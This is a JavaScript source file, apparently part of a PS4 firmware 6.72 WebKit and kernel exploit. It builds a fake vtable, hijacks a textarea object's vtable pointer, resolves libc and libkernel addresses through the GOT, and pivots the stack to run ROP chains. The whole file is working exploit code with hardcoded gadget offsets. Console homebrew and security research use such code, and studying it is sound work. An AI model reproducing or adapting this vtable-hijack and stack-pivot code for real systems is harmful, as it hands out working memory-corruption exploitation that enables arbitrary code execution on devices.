// rop.js
// ROP chain helper functions for PS4 6.72 kernel exploitation.
// Uses the arbitrary read/write primitives from the WebKit exploit to build
// fake vtables and execute ROP chains in kernel context.

// Create a textarea element to hijack its vtable for code execution
var tarea = document.createElement('textarea');

// Read the real vtable pointer from the textarea object
var real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18);

// Allocate memory for a fake vtable and copy the real vtable contents
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));

// Read the real vtable's vtable pointer (meta-vtable)
var real_vtable = read_ptr_at(fake_vt_ptr);

// Allocate a larger fake vtable and copy the real vtable contents
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));

// Patch the fake vtable pointer to point to the new fake vtable
write_ptr_at(fake_vt_ptr, fake_vtable);

// Backup the fake vtable for restoration after ROP execution
var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));

// Calculate the base address of the PLT (Procedure Linkage Table)
// This is used to resolve function addresses dynamically
var plt_ptr = read_ptr_at(fake_vtable) - 10063176;

/**
 * Resolves the address of a GOT (Global Offset Table) entry by index.
 * Used to find addresses of kernel and libc functions.
 * 
 * @param {number} idx - Index into the GOT.
 * @returns {number} The resolved address.
 */
function get_got_addr(idx) {
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if (q[0] != 0xff || q[1] != 0x25)
        throw "invalid GOT entry";
    var offset = 0;
    for (var i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += p + 6;
    return read_ptr_at(offset);
}

// Calculate base addresses of important libraries and functions
var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705) - 0x10000;
var libc_base = get_got_addr(582);

// Offsets of useful functions in libc or kernel
var saveall_addr = libc_base + 0x2e2c8;
var loadall_addr = libc_base + 0x3275c;
var setjmp_addr = libc_base + 0xbfae0;
var longjmp_addr = libc_base + 0xbfb30;
var pivot_addr = libc_base + 0x327d2;
var infloop_addr = libc_base + 0x447a0;
var jop_frame_addr = libc_base + 0x715d0;
var get_errno_addr_addr = libkernel_base + 0x9ff0;
var pthread_create_addr = libkernel_base + 0xf980;

/**
 * Saves all CPU registers and state to a controlled memory area.
 * This is used to prepare for ROP execution by preserving state.
 * 
 * @returns {number} Address where the CPU state is saved.
 */
function saveall() {
    var ans = malloc(0x800); // Allocate buffer for saved state

    // Backup original function pointer
    var bak = read_ptr_at(fake_vtable + 0x1d8);

    // Patch vtable to point to saveall gadget
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);

    // Hijack textarea vtable pointer to fake vtable
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);

    // Trigger vtable call to save all registers
    tarea.scrollLeft = 0;

    // Restore textarea vtable pointer to original
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);

    // Save current fake vtable contents
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));

    // Restore fake vtable to original backup
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));

    // Patch vtable again to saveall gadget for second call
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);

    // Patch fake vtable pointer to fake vtable
    write_ptr_at(fake_vt_ptr + 0x38, 0x1234);

    // Hijack textarea vtable pointer to fake vtable again
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);

    // Trigger vtable call again
    tarea.scrollLeft = 0;

    // Restore textarea vtable pointer to real vtable
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);

    // Save second half of CPU state
    write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));

    // Restore fake vtable contents again
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));

    return ans; // Return address of saved CPU state
}

/**
 * Executes a ROP chain by pivoting the stack to controlled memory.
 * 
 * @param {number} buf - Address of the ROP chain buffer.
 * The first 8 bytes are reserved internally; the actual ROP chain starts at buf + 8.
 */
function pivot(buf) {
    var ans = malloc(0x400); // Allocate buffer for saved state

    // Backup original function pointer
    var bak = read_ptr_at(fake_vtable + 0x1d8);

    // Patch vtable to saveall gadget
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);

    // Hijack textarea vtable pointer to fake vtable
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);

    // Trigger saveall gadget
    tarea.scrollLeft = 0;

    // Restore textarea vtable pointer to real vtable
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);

    // Save fake vtable contents
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));

    // Restore fake vtable contents from backup
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));

    // Patch vtable pointer to pivot gadget
    write_ptr_at(fake_vtable + 0x1d8, pivot_addr);

    // Write ROP chain address into fake vtable
    write_ptr_at(fake_vt_ptr + 0x38, buf);

    // Adjust saved state to prepare for pivot
    write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);

    // Write saved state pointer into ROP chain buffer
    write_ptr_at(buf, ans);

    // Hijack textarea vtable pointer to fake vtable again
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);

    // Trigger pivot gadget, starting ROP chain execution
    tarea.scrollLeft = 0;

    // Restore textarea vtable pointer to real vtable after execution
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);

    // Restore fake vtable contents from backup
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
}
